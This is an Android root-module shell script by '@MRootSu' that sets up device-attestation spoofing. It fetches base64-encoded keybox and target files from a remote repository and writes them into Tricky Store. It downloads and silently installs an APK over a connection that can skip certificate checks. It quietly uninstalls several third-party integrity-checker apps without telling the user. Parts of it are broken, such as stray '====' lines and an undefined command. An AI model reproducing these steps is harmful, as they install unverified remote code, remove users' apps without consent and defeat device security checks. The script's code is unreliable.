  #!/system/bin/sh
echo "
             اللهم صّلِ وسَلّمْ عَلۓِ نَبِيْنَامُحَمد ﷺ
   ╗────────────────────────────────────╔
     King 👑 Of The Root│Telegram : @MRootSu
   ╝────────────────────────────────────╚
"

#KeyBox By @MRootSu 🔑
TRICKY_DIR="/data/adb/tricky_store"
TARGET_FILE="$TRICKY_DIR/keybox.xml"
BACKUP_FILE="$TRICKY_DIR/keybox.xml.bak"
REMOTE_URL="https://raw.githubusercontent.com/MRootSu/IntegrityShield/refs/heads/main/KEY.MRootSu"
VERSION_URL="https://raw.githubusercontent.com/MRootSu/IntegrityShield/refs/heads/main/Copyright"

ui_print() {
  echo "$1"
}

version() {

  if command -v curl >/dev/null 2>&1; then
    VERSION=$(curl -fsSL "$VERSION_URL")
    ui_print "- $VERSION "
  elif command -v wget >/dev/null 2>&1; then
    VERSION=$(wget -qO- "$VERSION_URL")
    ui_print
  else
    VERSION=""
    ui_print
  fi
}

override_keybox() {
  ui_print "- 💌 Auto Join My Channel 🫰 "
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$REMOTE_URL" | base64 -d > "$TARGET_FILE"  && ui_print "- 📲 Successfully Updating All Done! 💯"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- "$REMOTE_URL" | base64 -d > "$TARGET_FILE" && ui_print
  else
    ui_print
    ui_print
  fi
}

#⛓️🛠️Mahmoud Rooting King 👑 Of The Root 🚀
echo " ⚙️ Upgrading│KEY 🔑 PIF 📜 AdBlock 🚫 Target 🛡️"

mkdir -p "$TRICKY_DIR"

if [ -f "$TARGET_FILE" ]; then
  if grep -q "MRootSu" "$TARGET_FILE"; then
    ui_print
    version
    override_keybox
  else
    ui_print
    mv "$TARGET_FILE" "$BACKUP_FILE"
    version
    override_keybox
  fi
else
  ui_print
  touch "$TARGET_FILE"
  version
  override_keybox
fi
#Bootloader Lock By @MRooSu ✅
TRICKY_DIR="/data/adb/tricky_store"
TARGET_FILE="$TRICKY_DIR/target.txt"
BACKUP_FILE="$TRICKY_DIR/target.txt.bak"
REMOTE_URL="https://raw.githubusercontent.com/MRootSu/IntegrityShield/refs/heads/main/Bootloader"
VERSION_URL="https://raw.githubusercontent.com/MRootSu/IntegrityShield/refs/heads/main/Messages"

ui_print() {
  echo "$1"
}

version() {

  if command -v curl >/dev/null 2>&1; then
    VERSION=$(curl -fsSL "$VERSION_URL")
echo
echo
echo
    ui_print "$VERSION "
  elif command -v wget >/dev/null 2>&1; then
    VERSION=$(wget -qO- "$VERSION_URL")
    ui_print
  else
    VERSION=""
    ui_print
  fi
}

override_PIF() {
  ui_print
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$REMOTE_URL" | base64 -d > "$TARGET_FILE"  && ui_print
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- "$REMOTE_URL" | base64 -d > "$TARGET_FILE" && ui_print
  else
    ui_print
    ui_print
  fi
}

#⛓️King 👑 Of The Root│@MRootSu ♥️
ui_print

mkdir -p "$TRICKY_DIR"

if [ -f "$TARGET_FILE" ]; then
  if grep -q "MRootSu" "$TARGET_FILE"; then
    ui_print
    version
    override_PIF
  else
    ui_print
    mv "$TARGET_FILE" "$BACKUP_FILE"
    version
    override_PIF
  fi
else
  ui_print
  touch "$TARGET_FILE"
  version
  override_PIF
fi
# Installation MRootSu_Checker App ⭐
PATH=/data/adb/ap/bin:/data/adb/ksu/bin:/data/adb/magisk:/data/data/com.termux/files/usr/bin:$PATH
# Replace With Your Repository Details
REPO_OWNER="MRootSu"
REPO_NAME="IntegrityShield"

# App Package Name 🚀
APP_PACKAGE="net.maxters.droid.playi"

# Temporary Directory To Store The APK
TEMP_DIR="/data/local/tmp/MRootSu_Checker"
APK_PATH="$TEMP_DIR/app.apk"

# Create Necessary Directories
mkdir -p "$TEMP_DIR"

download() {
	if command -v curl > /dev/null 2>&1; then
		curl --connect-timeout 10 -Ls "$1"
        else
		busybox wget -T 10 --no-check-certificate -qO - "$1"
        fi
}    

# Get The Latest Release IntegrityShield ♻️
latest_release_url=$(download "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/releases/latest" \
    | grep '"browser_download_url":' \
    | sed -E 's/.*"browser_download_url": "(.*\.apk)".*/\1/')

# Check if The URL is Valid
if [ -z "$latest_release_url" ]; then
    echo "Error: Could not find a latest release URL."
    exit 1
fi

echo "Latest APK URL: $latest_release_url" >/dev/null 2>&1 &

# Download The APK IntegrityShield 💫
download "$latest_release_url" > "$APK_PATH" || echo "[x] Failed to download the APK."

# Install The APK As A User App
pm install -r "$APK_PATH" 2>&1 </dev/null | cat
#Text Logo By @MRootSu 🛠️
echo "            🇦🇪🇧🇭🇪🇬🇶🇦🇮🇶🇯🇴🇱🇧🇰🇼🇱🇾🇾🇪🇵🇸🇸🇦🇸🇩 "
echo
echo " 🫰 تم صنع الاسكريبت بكل الحب 💌 بواسطة [ مستر روت ] ⛅ "
echo
echo

MODDIR="/data/adb/modules/playintegrityfix"
persist_dir="/data/adb/Re-Malwack"
function abort() {
    echo "- $1"
    sleep 0.5
    exit 1
}

sh "$MODDIR/rmlwk.sh" --update-hosts || abort "- Failed to update hosts."
#Remove PlayIntegrity Checker By @MRootSu 🪃
conflict_packages="com.henrikherzig.playintegritychecker"
found=0
for pkg in $conflict_packages; do
  if grep -q "$pkg" /data/system/packages.list; then 
    [ $found -eq 0 ] && echo
    found=1

    echo "$pkg" > /dev/null

    if [ "$pkg" = "com.henrikherzig.playintegritychecker" ]; then
      echo " $pkg" > /dev/null
      pm uninstall --user 0 "$pkg" > /dev/null
    fi
  fi
done
[ $found -eq 1 ] && echo
====================================
conflict_packages="gr.nikolasspyr.integritycheck"
found=0
for pkg in $conflict_packages; do
  if grep -q "$pkg" /data/system/packages.list; then 
    [ $found -eq 0 ] && echo
    found=1

    echo "$pkg" > /dev/null

    if [ "$pkg" = "gr.nikolasspyr.integritycheck" ]; then
      echo " $pkg" > /dev/null
      pm uninstall --user 0 "$pkg" > /dev/null
    fi
  fi
done
[ $found -eq 1 ] && echo
====================================
conflict_packages="krypton.tbsafetychecker"
found=0
for pkg in $conflict_packages; do
  if grep -q "$pkg" /data/system/packages.list; then 
    [ $found -eq 0 ] && echo
    found=1

    echo "$pkg" > /dev/null

    if [ "$pkg" = "krypton.tbsafetychecker" ]; then
      echo " $pkg" > /dev/null
      pm uninstall --user 0 "$pkg" > /dev/null
    fi
  fi
done
[ $found -eq 1 ] && echo
echo
sleep 9
nohup am start -n "net.maxters.droid.playi/gr.nikolasspyr.integritycheck.MainActivity" >/dev/null 2>&1 &
sleep_pause
